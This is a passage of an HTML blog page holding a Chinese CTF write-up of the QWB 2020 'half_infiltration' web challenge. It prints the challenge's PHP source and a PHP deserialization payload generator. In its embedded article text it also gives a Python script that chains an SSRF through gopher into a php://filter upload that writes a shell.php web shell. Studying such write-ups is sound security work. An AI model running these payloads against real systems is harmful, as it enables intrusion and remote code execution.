<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>qwb2020web复现 | ch3n9w の 超元域</title>
<meta name="keywords" content="">
<meta name="description" content="half_infiltration
开局的页面如下
&lt;?php
highlight_file(__FILE__);

$flag=file_get_contents(&#39;ssrf.php&#39;);

class Pass
{


    function read()
    {
        ob_start();
        global $result;
        print $result;

    }
}

class User
{
    public $age,$sex,$num;

    function __destruct()
    {
        $student = $this-&gt;age;
        $boy = $this-&gt;sex;
        $a = $this-&gt;num;
    $student-&gt;$boy();
    if(!(is_string($a)) ||!(is_string($boy)) || !(is_object($student)))
    {
        ob_end_clean();
        exit();
    }
    global $$a;
    $result=$GLOBALS[&#39;flag&#39;];
        ob_end_clean();
    }
}

if (isset($_GET[&#39;x&#39;])) {
    unserialize($_GET[&#39;x&#39;])-&gt;get_it();
} 
思路是进行两次反序列化, 第一次将$_GLOBALS[&lsquo;flag&rsquo;]赋值给全局变量$result, 第二次反序列化是让程序在ob_end_clean()执行之前报错退出. ob_start会打开输出缓冲

启用输出缓冲会导致PHP开始存储你输出的脚本而不是立即将它们发送到客户端。当脚本结束或者你调用了ob_flush()函数，PHP才会将内容发送到客户端。">
<meta name="author" content="ch3n9w">
<link rel="canonical" href="http://dragonbox.top/posts/ctf-qwb2020-web-1/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.b609c58d5c11bb90b1a54e04005d74ad1ddf22165eb79f5533967e57df9c3b50.css" integrity="sha256-tgnFjVwRu5CxpU4EAF10rR3fIhZet59VM5Z&#43;V9&#43;cO1A=" rel="preload stylesheet" as="style">
<link rel="icon" href="http://dragonbox.top/flash.ico">
<link rel="icon" type="image/png" sizes="16x16" href="http://dragonbox.top/flash.ico">
<link rel="icon" type="image/png" sizes="32x32" href="http://dragonbox.top/flash.ico">
<link rel="apple-touch-icon" href="http://dragonbox.top/flash.ico">
<link rel="mask-icon" href="http://dragonbox.top/flash.ico">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="http://dragonbox.top/posts/ctf-qwb2020-web-1/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="qwb2020web复现" />
<meta property="og:description" content="half_infiltration
开局的页面如下
&lt;?php
highlight_file(__FILE__);

$flag=file_get_contents(&#39;ssrf.php&#39;);

class Pass
{


    function read()
    {
        ob_start();
        global $result;
        print $result;

    }
}

class User
{
    public $age,$sex,$num;

    function __destruct()
    {
        $student = $this-&gt;age;
        $boy = $this-&gt;sex;
        $a = $this-&gt;num;
    $student-&gt;$boy();
    if(!(is_string($a)) ||!(is_string($boy)) || !(is_object($student)))
    {
        ob_end_clean();
        exit();
    }
    global $$a;
    $result=$GLOBALS[&#39;flag&#39;];
        ob_end_clean();
    }
}

if (isset($_GET[&#39;x&#39;])) {
    unserialize($_GET[&#39;x&#39;])-&gt;get_it();
} 
思路是进行两次反序列化, 第一次将$_GLOBALS[&lsquo;flag&rsquo;]赋值给全局变量$result, 第二次反序列化是让程序在ob_end_clean()执行之前报错退出. ob_start会打开输出缓冲

启用输出缓冲会导致PHP开始存储你输出的脚本而不是立即将它们发送到客户端。当脚本结束或者你调用了ob_flush()函数，PHP才会将内容发送到客户端。" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://dragonbox.top/posts/ctf-qwb2020-web-1/" />
<meta property="og:image" content="http://dragonbox.top/image-20211114141959846.png" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2020-08-27T20:48:12+00:00" />
<meta property="article:modified_time" content="2020-08-27T20:48:12+00:00" />

<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="http://dragonbox.top/image-20211114141959846.png" />
<meta name="twitter:title" content="qwb2020web复现"/>
<meta name="twitter:description" content="half_infiltration
开局的页面如下
&lt;?php
highlight_file(__FILE__);

$flag=file_get_contents(&#39;ssrf.php&#39;);

class Pass
{


    function read()
    {
        ob_start();
        global $result;
        print $result;

    }
}

class User
{
    public $age,$sex,$num;

    function __destruct()
    {
        $student = $this-&gt;age;
        $boy = $this-&gt;sex;
        $a = $this-&gt;num;
    $student-&gt;$boy();
    if(!(is_string($a)) ||!(is_string($boy)) || !(is_object($student)))
    {
        ob_end_clean();
        exit();
    }
    global $$a;
    $result=$GLOBALS[&#39;flag&#39;];
        ob_end_clean();
    }
}

if (isset($_GET[&#39;x&#39;])) {
    unserialize($_GET[&#39;x&#39;])-&gt;get_it();
} 
思路是进行两次反序列化, 第一次将$_GLOBALS[&lsquo;flag&rsquo;]赋值给全局变量$result, 第二次反序列化是让程序在ob_end_clean()执行之前报错退出. ob_start会打开输出缓冲

启用输出缓冲会导致PHP开始存储你输出的脚本而不是立即将它们发送到客户端。当脚本结束或者你调用了ob_flush()函数，PHP才会将内容发送到客户端。"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "http://dragonbox.top/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "qwb2020web复现",
      "item": "http://dragonbox.top/posts/ctf-qwb2020-web-1/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "qwb2020web复现",
  "name": "qwb2020web复现",
  "description": "half_infiltration 开局的页面如下\n\u0026lt;?php highlight_file(__FILE__); $flag=file_get_contents(\u0026#39;ssrf.php\u0026#39;); class Pass { function read() { ob_start(); global $result; print $result; } } class User { public $age,$sex,$num; function __destruct() { $student = $this-\u0026gt;age; $boy = $this-\u0026gt;sex; $a = $this-\u0026gt;num; $student-\u0026gt;$boy(); if(!(is_string($a)) ||!(is_string($boy)) || !(is_object($student))) { ob_end_clean(); exit(); } global $$a; $result=$GLOBALS[\u0026#39;flag\u0026#39;]; ob_end_clean(); } } if (isset($_GET[\u0026#39;x\u0026#39;])) { unserialize($_GET[\u0026#39;x\u0026#39;])-\u0026gt;get_it(); } 思路是进行两次反序列化, 第一次将$_GLOBALS[\u0026lsquo;flag\u0026rsquo;]赋值给全局变量$result, 第二次反序列化是让程序在ob_end_clean()执行之前报错退出. ob_start会打开输出缓冲\n启用输出缓冲会导致PHP开始存储你输出的脚本而不是立即将它们发送到客户端。当脚本结束或者你调用了ob_flush()函数，PHP才会将内容发送到客户端。\n",
  "keywords": [
    
  ],
  "articleBody": "half_infiltration 开局的页面如下\n\u003c?php highlight_file(__FILE__); $flag=file_get_contents('ssrf.php'); class Pass { function read() { ob_start(); global $result; print $result; } } class User { public $age,$sex,$num; function __destruct() { $student = $this-\u003eage; $boy = $this-\u003esex; $a = $this-\u003enum; $student-\u003e$boy(); if(!(is_string($a)) ||!(is_string($boy)) || !(is_object($student))) { ob_end_clean(); exit(); } global $$a; $result=$GLOBALS['flag']; ob_end_clean(); } } if (isset($_GET['x'])) { unserialize($_GET['x'])-\u003eget_it(); } 思路是进行两次反序列化, 第一次将$_GLOBALS[‘flag’]赋值给全局变量$result, 第二次反序列化是让程序在ob_end_clean()执行之前报错退出. ob_start会打开输出缓冲\n启用输出缓冲会导致PHP开始存储你输出的脚本而不是立即将它们发送到客户端。当脚本结束或者你调用了ob_flush()函数，PHP才会将内容发送到客户端。\nob_end_clean会将输出缓冲的内容进行一个清空, 那么如果要看到$result的内容的话, 我们就需要在ob_end_clean之前退出程序. 通过将$a赋值为this可以做到让程序报错退出.\n\u003c?php class Pass{ function read(){ // ob_start(); global $result; print $result; } } class User{ public $age, $sex, $num; function __construct($a, $b, $c) { $this-\u003eage = $a; $this-\u003esex = $b; $this-\u003enum = $c; } } echo urlencode(serialize([ new User(new Pass(), \"read\", \"result\"), new User(new Pass(), \"read\", \"this\") ])); ?\u003e 然后我们可以看到ssrf.php的内容\n\u003c?php //经过扫描确认35000以下端口以及50000以上端口不存在任何内网服务,请继续渗透内网 $url = $_GET['we_have_done_ssrf_here_could_you_help_to_continue_it'] ?? false; if(preg_match(\"/flag|var|apache|conf|proc|log/i\" ,$url)){ die(\"\"); } if($url) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_HEADER, 1); curl_exec($ch); curl_close($ch); } ?\u003e 扫描发现\nhttp://39.98.131.124/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=http://127.0.0.1:40000/\n有东西\nHTTP/1.1 200 OK Date: Thu, 27 Aug 2020 13:04:07 GMT Server: Apache/2.4.18 (Ubuntu) Set-Cookie: PHPSESSID=60uap1c9tcik5f1ivmqqp933g2; path=/ Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate Pragma: no-cache Vary: Accept-Encoding Content-Length: 1121 Content-Type: text/html; charset=UTF-8 \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e \u003ctitle\u003eMessage Board\u003c/title\u003e \u003clink rel=\"stylesheet\" href=\"css/bootstrap.min.css\" /\u003e \u003c/head\u003e \u003cbody\u003e \u003cdiv class=\"container\" style=\"text-align:center;vertical-align:middle;\"\u003e \u003cdiv class=\"row\" style=\"text-align:center;vertical-align:middle;\"\u003e \u003ch1\u003eMessage Board \u003c/h1\u003e \u003c/div\u003e \u003cdiv class=\"row\"\u003e \u003cbr\u003e\u003cbr\u003e \u003cp class=\"lead\"\u003e Since there is only one administrator, a person can only submit one opinion at a time. Each time a new opinion is submitted, all old comments will be deleted \u003cbr\u003e\u003cbr\u003e \u003c/p\u003e \u003c/div\u003e \u003cbr\u003e \u003cdiv class=\"row\" style=\"text-align:center;vertical-align:middle;\"\u003e \u003cform method=\"POST\" class=\"form-inline\"\u003e \u003cdiv class=\"form-group\"\u003e \u003cinput class='form-control' type=\"text\" name=\"file\"\u003e \u003c/div\u003e \u003cdiv class='panel-body'\u003e \u003ctextarea class='form-control' name='content' rows='6'\u003e\u003c/textarea\u003e \u003cbr\u003e \u003cbr\u003e \u003cdiv class=\"form-group\"\u003e \u003cbutton type=\"submit\" class='btn btn-default col-md-2 form-control' value=\"Submit\"\u003eSubmit\u003c/button\u003e \u003c/div\u003e \u003c/form\u003e \u003c/div\u003e 同时\nhttp://39.98.131.124/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=http://127.0.0.1:40000/uploads/\n可以访问, 那么这里应该是上传东西到目录下面了.这里使用gopher协议来发送post上传文件, 这里依然会有一个过滤, 包括等号在内的几种符号和字母组合都被过滤了,使用二次编码协议来绕过.\nimport requests from urllib.parse import urlencode, quote_plus, quote url0 = \"http://39.98.131.124/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=gopher://127.0.0.1:40000/_\" upload_data = { 'file':'php://filter/convert.base64-decode|convert.base64-decode/resource=shell.php', 'content':'UEQ4OVlHTmhkQ0F2Wm14aFoyQTc' # 似乎可以正常解密的base64都无法写入文件中 } upload_data = urlencode(upload_data, quote_via=quote_plus) print(upload_data) gopher_content = '''POST / HTTP/1.1 Host: 127.0.0.1:40000 Cookie: PHPSESSID=hhhhhhhhhhhhhhhhhhhhhhhaaa; Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: {length} {data}'''.format(length = len(upload_data), data=upload_data).replace('\\n', '\\r\\n') # ssrf need double url encode url = url0 + quote(quote(gopher_content)) header = {\"Upgrade-Insecure-Requests\": \"1\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\", \"Accept-Encoding\": \"gzip, deflate\", \"Accept-Language\": \"zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7\", \"Connection\": \"close\"} while True: requests.get(url, headers=header) validate = \"http://39.98.131.124/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=http://127.0.0.1:40000/uploads/hhhhhhhhhhhhhhhhhhhhhhhaaa/shell.php res = requests.get(validate) print(res.content) ",
  "wordCount" : "370",
  "inLanguage": "en",
  "image":"http://dragonbox.top/image-20211114141959846.png","datePublished": "2020-08-27T20:48:12Z",
  "dateModified": "2020-08-27T20:48:12Z",
  "author":{
    "@type": "Person",
    "name": "ch3n9w"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "http://dragonbox.top/posts/ctf-qwb2020-web-1/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "ch3n9w の 超元域",
    "logo": {
      "@type": "ImageObject",
      "url": "http://dragonbox.top/flash.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="http://dragonbox.top/" accesskey="h" title="ch3n9w の 超元域 (Alt + H)">
                <img src="http://dragonbox.top/avatar.jpg" alt="" aria-label="logo"
                    height="35">ch3n9w の 超元域</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="http://dragonbox.top/categories/" title="categories">
                    <span>categories</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="http://dragonbox.top/">Home</a>&nbsp;»&nbsp;<a href="http://dragonbox.top/posts/">Posts</a></div>
    <h1 class="post-title entry-hint-parent">
      qwb2020web复现
    </h1>
    <div class="post-meta"><span title='2020-08-27 20:48:12 +0000 UTC'>August 27, 2020</span>&nbsp;·&nbsp;2 min&nbsp;·&nbsp;370 words&nbsp;·&nbsp;ch3n9w

</div>
  </header> 
<figure class="entry-cover">
        <img loading="eager" srcset="http://dragonbox.top/posts/ctf-qwb2020-web-1/image-20211114141959846_hu1815068689607361705.png 360w ,http://dragonbox.top/posts/ctf-qwb2020-web-1/image-20211114141959846_hu7669767990326402703.png 480w ,http://dragonbox.top/posts/ctf-qwb2020-web-1/image-20211114141959846_hu9398446658780294442.png 720w ,http://dragonbox.top/posts/ctf-qwb2020-web-1/image-20211114141959846_hu17098981144027839555.png 1080w ,http://dragonbox.top/posts/ctf-qwb2020-web-1/image-20211114141959846.png 1296w" 
            sizes="(min-width: 768px) 720px, 100vw" src="http://dragonbox.top/posts/ctf-qwb2020-web-1/image-20211114141959846.png" alt="" 
            width="1296" height="660">
        
</figure><div class="toc">
    <details  open>
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><nav id="TableOfContents">
  <ul>
    <li><a href="#half_infiltration">half_infiltration</a></li>
  </ul>
</nav>
        </div>
    </details>
</div>

  <div class="post-content"><h2 id="half_infiltration">half_infiltration<a hidden class="anchor" aria-hidden="true" href="#half_infiltration">#</a></h2>
<p>开局的页面如下</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$flag<span style="color:#f92672">=</span><span style="color:#a6e22e">file_get_contents</span>(<span style="color:#e6db74">&#39;ssrf.php&#39;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Pass</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">read</span>()
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">ob_start</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">global</span> $result;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">print</span> $result;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">User</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $age,$sex,$num;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> __destruct()
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        $student <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">age</span>;
</span></span><span style="display:flex;"><span>        $boy <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">sex</span>;
</span></span><span style="display:flex;"><span>        $a <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">num</span>;
</span></span><span style="display:flex;"><span>    $student<span style="color:#f92672">-&gt;</span>$boy();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>(<span style="color:#a6e22e">is_string</span>($a)) <span style="color:#f92672">||!</span>(<span style="color:#a6e22e">is_string</span>($boy)) <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>(<span style="color:#a6e22e">is_object</span>($student)))
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">ob_end_clean</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">exit</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">global</span> $$a;
</span></span><span style="display:flex;"><span>    $result<span style="color:#f92672">=</span>$GLOBALS[<span style="color:#e6db74">&#39;flag&#39;</span>];
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">ob_end_clean</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;x&#39;</span>])) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">unserialize</span>($_GET[<span style="color:#e6db74">&#39;x&#39;</span>])<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">get_it</span>();
</span></span><span style="display:flex;"><span>} 
</span></span></code></pre></div><p>思路是进行两次反序列化, 第一次将$_GLOBALS[&lsquo;flag&rsquo;]赋值给全局变量$result, 第二次反序列化是让程序在<code>ob_end_clean()</code>执行之前报错退出. <code>ob_start</code>会打开输出缓冲</p>
<blockquote>
<p>启用输出缓冲会导致PHP开始存储你输出的脚本而不是立即将它们发送到客户端。当脚本结束或者你调用了ob_flush()函数，PHP才会将内容发送到客户端。</p>
</blockquote>
<p><code>ob_end_clean</code>会将输出缓冲的内容进行一个清空, 那么如果要看到$result的内容的话, 我们就需要在<code>ob_end_clean</code>之前退出程序. 通过将$a赋值为this可以做到让程序报错退出.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Pass</span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">read</span>(){
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// ob_start();
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">global</span> $result;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">print</span> $result;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">User</span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $age, $sex, $num;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> __construct($a, $b, $c)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>	$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">age</span> <span style="color:#f92672">=</span> $a;
</span></span><span style="display:flex;"><span>	$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">sex</span> <span style="color:#f92672">=</span> $b;
</span></span><span style="display:flex;"><span>	$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">num</span> <span style="color:#f92672">=</span> $c;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">urlencode</span>(<span style="color:#a6e22e">serialize</span>([
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">User</span>(<span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Pass</span>(), <span style="color:#e6db74">&#34;read&#34;</span>, <span style="color:#e6db74">&#34;result&#34;</span>),
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">User</span>(<span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Pass</span>(), <span style="color:#e6db74">&#34;read&#34;</span>, <span style="color:#e6db74">&#34;this&#34;</span>)
</span></span><span style="display:flex;"><span>    ]));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>然后我们可以看到ssrf.php的内容</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> 
</span></span><span style="display:flex;"><span><span style="color:#75715e">//经过扫描确认35000以下端口以及50000以上端口不存在任何内网服务,请继续渗透内网
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    $url <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;we_have_done_ssrf_here_could_you_help_to_continue_it&#39;</span>] <span style="color:#f92672">??</span> <span style="color:#66d9ef">false</span>; 
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/flag|var|apache|conf|proc|log/i&#34;</span> ,$url)){
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;&#34;</span>);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>($url)
</span></span><span style="display:flex;"><span>    { 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            $ch <span style="color:#f92672">=</span> <span style="color:#a6e22e">curl_init</span>(); 
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">curl_setopt</span>($ch, <span style="color:#a6e22e">CURLOPT_URL</span>, $url); 
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">curl_setopt</span>($ch, <span style="color:#a6e22e">CURLOPT_HEADER</span>, <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">curl_exec</span>($ch);
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">curl_close</span>($ch); 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>     } 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>扫描发现</p>
<p>http://39.98.131.124/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=http://127.0.0.1:40000/</p>
<p>有东西</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>HTTP/1.1 200 OK
</span></span><span style="display:flex;"><span>Date: Thu, 27 Aug 2020 13:04:07 GMT
</span></span><span style="display:flex;"><span>Server: Apache/2.4.18 (Ubuntu)
</span></span><span style="display:flex;"><span>Set-Cookie: PHPSESSID=60uap1c9tcik5f1ivmqqp933g2; path=/
</span></span><span style="display:flex;"><span>Expires: Thu, 19 Nov 1981 08:52:00 GMT
</span></span><span style="display:flex;"><span>Cache-Control: no-store, no-cache, must-revalidate
</span></span><span style="display:flex;"><span>Pragma: no-cache
</span></span><span style="display:flex;"><span>Vary: Accept-Encoding
</span></span><span style="display:flex;"><span>Content-Length: 1121
</span></span><span style="display:flex;"><span>Content-Type: text/html; charset=UTF-8
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE html&gt;</span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">head</span>&gt;
</span></span><span style="display:flex;"><span>	&lt;<span style="color:#f92672">title</span>&gt;Message Board&lt;/<span style="color:#f92672">title</span>&gt;
</span></span><span style="display:flex;"><span>	&lt;<span style="color:#f92672">link</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;css/bootstrap.min.css&#34;</span> /&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">head</span>&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">body</span>&gt;
</span></span><span style="display:flex;"><span>	&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;container&#34;</span> <span style="color:#a6e22e">style</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text-align:center;vertical-align:middle;&#34;</span>&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;row&#34;</span> <span style="color:#a6e22e">style</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text-align:center;vertical-align:middle;&#34;</span>&gt;
</span></span><span style="display:flex;"><span>			&lt;<span style="color:#f92672">h1</span>&gt;Message Board &lt;/<span style="color:#f92672">h1</span>&gt;
</span></span><span style="display:flex;"><span>		&lt;/<span style="color:#f92672">div</span>&gt;
</span></span><span style="display:flex;"><span>		&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;row&#34;</span>&gt;
</span></span><span style="display:flex;"><span>			&lt;<span style="color:#f92672">br</span>&gt;&lt;<span style="color:#f92672">br</span>&gt;
